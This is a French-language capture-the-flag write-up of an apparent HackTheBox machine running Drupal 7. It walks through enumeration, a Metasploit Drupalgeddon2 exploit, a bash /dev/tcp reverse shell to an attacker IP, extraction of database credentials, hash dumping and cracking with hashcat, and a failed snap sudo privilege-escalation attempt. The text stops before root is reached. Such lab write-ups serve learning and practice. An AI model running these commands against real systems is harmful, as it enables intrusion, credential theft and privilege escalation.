- [Enumération](#enumération)
	- [Nmap](#nmap)
	- [Web](#web)
- [FootHold:](#foothold)
	- [Exploit - Drupalgeddon2](#exploit---drupalgeddon2)
	- [Upgrade du shell](#upgrade-du-shell)
- [User](#user)
	- [Crack du hash avec hashcat](#crack-du-hash-avec-hashcat)
- [Root](#root)

# Enumération

## Nmap

```
nmap armageddon -sV -p-



```



## Web 

```
whatweb armageddon.htb

http://armageddon.htb [200 OK] Apache[2.4.6], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.129.162.170], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon], Script[text/javascript], Title[Welcome to  Armageddon |  Armageddon], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]
```

CMS: Drupal 7

# FootHold: 

## Exploit - Drupalgeddon2

Il s'agit d'un site tournant sous Drupal 7, donc on essaie Drupalgeddon2 (qui est un exploit assez répendu sur ce CMS) 


	msfconsole

	use unix/webapp/drupal_drupalgeddon2
	set RHOST < ip victime > 
	set LHOST < ip attaquant >
	run 

Puis "shell" pour récupérer un shell

	shell

## Upgrade du shell 

Ouvrir un port en écoute sur notre kali:
	
	nc -lvnp 4444

Puis sur la machine "victime" envoyer un shell sur notre Kali au travers du port 4444

	bash -c 'bash -i >& /dev/tcp/10.10.14.72/4444 0>&1' &

Cepedant nous allons devoir nous contenter de ce shell, il ne semble pas possible de pouvoir upgrader le shelle à l'aide de python.

# User 

## Dump Hash 

Une fois connecté, on énumère les répertoires / fichiers à la recherche de credentials. En recherchant sur internet "where to find drupal password" un forum indique qu'il faut regarder dans `/var/html/sites/default/settings.php`. 

```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
On essaie de se connecter à la base de donnée correspondante:

	mysql drupal --user=drupaluser --password=CQHEy@9M*m23gBVj

Cependant, nous n'avons pas un tty correct, alors cela ne marche pas. Utilsons l'optoon `-e` qui permet d'éxécuter des commandes 

```
mysql drupal --user=drupaluser --password=CQHEy@9M*m23gBVj -e 'show tables;'

mysql drupal --user=drupaluser --password=CQHEy@9M*m23gBVj -e 'select * from users;'
```

Nous obtenons donc:

	brucetherealadmin     $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

## Crack du hash avec hashcat

il s'agit d'un hash effectué avec Drupal7. 
En cherchant on tombe sur la méthode 7900 pour cracker ce genre de hash.

	hashcat -a 0 -m 7900 hash.txt /usr/share/wordlists/rockyou.txt -o crack.txt

On obtient donc:

	brucetherealadmin:booboo

On se connecte en SSH:

	ssh brucetherealadmin@armageddon.htb

# Root 

On regarde les droits que possède notre utilisateur:

```
sudo -l

Entrées par défaut pour brucetherealadmin sur armageddon :
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

L'utilisateur brucetherealadmin peut utiliser les commandes suivantes sur armageddon :
    (root) NOPASSWD: /usr/bin/snap install *
```

Nous pouvons éxécuter snap en tant que root. 
Sur gtfobins il existe une escalade de privilège au travers de ce binaire (https://gtfobins.github.io/gtfobins/snap/#sudo):

```
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta

# Puis

sudo snap install xxxx_1.0_all.snap --dangerous --devmode

```

L'exploit ne fontionne pas, fpm n'est pas installé sur la machine.

Nouvelle piste ... 
